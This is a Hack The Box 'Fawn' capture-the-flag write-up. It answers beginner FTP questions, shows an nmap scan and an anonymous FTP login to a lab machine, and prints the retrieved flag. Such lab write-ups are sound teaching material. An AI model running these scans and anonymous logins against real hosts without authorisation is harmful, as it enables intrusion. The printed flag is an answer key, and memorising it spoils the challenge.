# Fawn

## Machine Details 

- **CTF:** Hack The Box
- **Category:** Tier 0

## Solution

#### 1. What does the 3-letter acronym FTP stand for?

> File Transfer Protocol

#### 2. Which port does the FTP service listen on usually?

> 21

#### 3. What acronym is used for the secure version of FTP?

> SFTP

#### 4. What is the command we can use to send an ICMP echo request to test our connection to the target?

> ping

#### 5. From your scans, what version is FTP running on the target?

```sh
$ nmap -A -T4 10.129.1.14
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-01 12:42 CET
Nmap scan report for 10.129.1.14
Host is up (0.035s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.107
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.33 seconds
```

> vsftpd 3.0.3

#### 6. From your scans, what OS type is running on the target?

> Unix

#### 7. What is the command we need to run in order to display the 'ftp' client help menu?

> ftp -h

#### 8. What is username that is used over FTP when you want to log in without having an account?

> anonymous

#### 9. What is the response code we get for the FTP message 'Login successful'?

```sh
$ ftp 10.129.1.14
Connected to 10.129.1.14.
220 (vsFTPd 3.0.3)
Name (10.129.1.14): anonymous
331 Please specify the password.
Password: 
230 Login successful.
ftp>
```

> 230

#### 10. There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.

> ls

#### 11. What is the command used to download the file we found on the FTP server?

> get

#### Submit root flag

```sh
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0,000545 seconds (57,3 kbytes/s)
ftp> ^D221 Goodbye.
$ cat flag.txt 
035db21c881520061c53e0536e44f815
```

## Final Flag

> 035db21c881520061c53e0536e44f815

*Created by [bu19akov](https://github.com/bu19akov)*